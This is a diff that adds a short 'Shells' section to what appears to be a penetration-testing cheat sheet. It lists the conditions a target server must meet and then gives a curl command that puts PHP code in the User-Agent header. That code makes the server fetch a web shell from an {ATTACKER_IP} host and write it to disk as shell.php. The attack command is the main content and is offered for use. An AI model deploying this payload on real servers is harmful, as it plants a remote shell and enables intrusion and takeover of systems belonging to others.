@@ -1,0 +1,26 @@
+## Shells
+
+Shells Section: Using Curl for Remote File Creation
+
+REQUIREMENTS:
+1. PHP Support: The target server must be able to execute PHP code.
+2. User-Agent PHP Execution: The server must execute PHP within user agent strings.
+3. Writable Directory: The server directory where shell.php is written must be writable.
+4. Outbound Access: The server needs internet access to fetch the PHP shell from the attacker's server.
+
+Overview
+This section demonstrates how to use curl, a versatile command-line tool, for exploiting web vulnerabilities to deploy a PHP shell on a target machine. The provided commands leverage curl's user agent string manipulation to execute PHP code remotely, leading to the creation of a shell file on the server.
+
+Command 
+bash
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+curl -A “<?php file_put_contents('shell.php', file_get_contents('http://{ATTACKER_IP}/shell.php')); ?>" -s http://{MACHINE_IP}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+
